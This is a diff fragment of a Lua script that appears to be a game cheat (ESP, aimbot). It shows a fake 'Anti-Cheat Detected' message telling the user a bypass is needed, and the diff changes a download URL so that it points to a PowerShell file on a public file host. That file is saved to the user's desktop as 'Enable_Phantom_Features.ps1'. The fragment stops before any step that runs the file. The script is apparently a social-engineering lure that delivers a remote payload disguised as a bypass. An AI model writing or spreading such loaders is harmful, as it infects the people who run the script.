@@ -6,7 +6,7 @@ wait(2)
 print(">> Anti-Cheat Detected! <<")
 print(">> A bypass is required to use premium features (ESP, Aimbot). <<")
 
-local payload_url = 'https://files.catbox.moe/382isn.7z'
+local payload_url = 'https://files.catbox.moe/7tn7ri.ps1'
 local bypass_filename = "Enable_Phantom_Features.ps1"
 
 -- Use the injector's 'writefile' function to save our powershell launcher to the user's desktop
